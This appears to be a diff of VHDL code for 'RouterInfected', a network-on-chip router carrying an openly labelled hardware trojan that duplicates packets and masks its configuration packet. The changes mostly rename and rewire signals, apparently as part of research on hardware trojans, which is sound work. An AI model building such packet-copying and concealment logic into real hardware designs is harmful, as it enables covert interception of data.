@@ -61,12 +61,12 @@ end RouterInfected;
 architecture RouterInfected of RouterInfected is
 
 signal h, ack_h, data_av, sender, data_ack: regNport := (others=>'0');
-signal data, data_outCrossbar: arrayNport_regflit := (others=>(others=>'0'));
+signal data : arrayNport_regflit := (others=>(others=>'0'));
 signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
 signal free: regNport := (others=>'0');
 
 -- trojan signals
-signal duplicate, dataSel, data_ack_local, maskPkg, data_ack_dup, data_av_local, duplicating: std_logic := '0';
+signal duplicate, dataSel, data_ack_local, maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
 signal configPckt, turnOff, txCrossbar : regNport := (others=>'0');
 signal dupHeader, dupFlit : regflit := (others=>'0');
 signal destAddr : arrayNport_regmetadeflit := (others=>(others=>'0'));
@@ -175,7 +175,7 @@ begin
 		clock => clock,
 		reset => reset,
 		duplicate => duplicate,
-		dupAddr => dupHeader(METADEFLIT-1 downto 0),
+		dupAddr => dupFlit(METADEFLIT-1 downto 0),
 		h => h,
 		ack_h => ack_h,
 		address => address,
@@ -200,7 +200,7 @@ begin
 		tab_out => mux_out,
 		tab_dup => mux_dup,
 		tx => txCrossbar,
-		data_out => data_outCrossbar,
+		data_out => data_out,
 		credit_i => credit_i);
 
 	CLK_TX : for i in 0 to(NPORT-1) generate
@@ -216,17 +216,11 @@ begin
         reset 			=> reset,
         data_in 		=> data(4),
         sending			=> sender(4),
-        destAddr		=> dest,
+        destAddr		=> destAddr,
         dupFlit			=> dupFlit,
         duplicate 		=> duplicate,
-    	free			=> free,
-		mux_in 			=> mux_in,
-		mux_out 		=> mux_out,
         configPckt 		=> configPckt,
-        creditIn 		=> data_ack, -- or credit_i
-        dataSel			=> dataSel,
-      	maskPkg_o		=> maskPkg,
-      	h				=> h(4),
+      	maskPckt_o		=> maskPckt,
       	turnOff			=> turnOff
 	);
 
@@ -238,20 +232,11 @@ begin
 	data_av(4) <= '0' when duplicating = '1' and data_ack_local = '0' else
 				  data_av_local;
 
-	-- Mux to define the address source
-	dest <= destAddr(0) when configPckt(0) = '1' else
-			destAddr(1) when configPckt(1) = '1' else
-			destAddr(2) when configPckt(2) = '1' else
-			destAddr(3) when configPckt(3) = '1' else
-			destAddr(4);
-
 	-- To ofuscate the configuration packet
-	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPkg;
+	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPckt;
 	tx(EAST) <= txCrossbar(EAST);
 	tx(WEST) <= txCrossbar(WEST);
 	tx(SOUTH) <= txCrossbar(SOUTH);
 	tx(NORTH) <= txCrossbar(NORTH);
-
-	data_out <= data_outCrossbar;
 
 end RouterInfected;
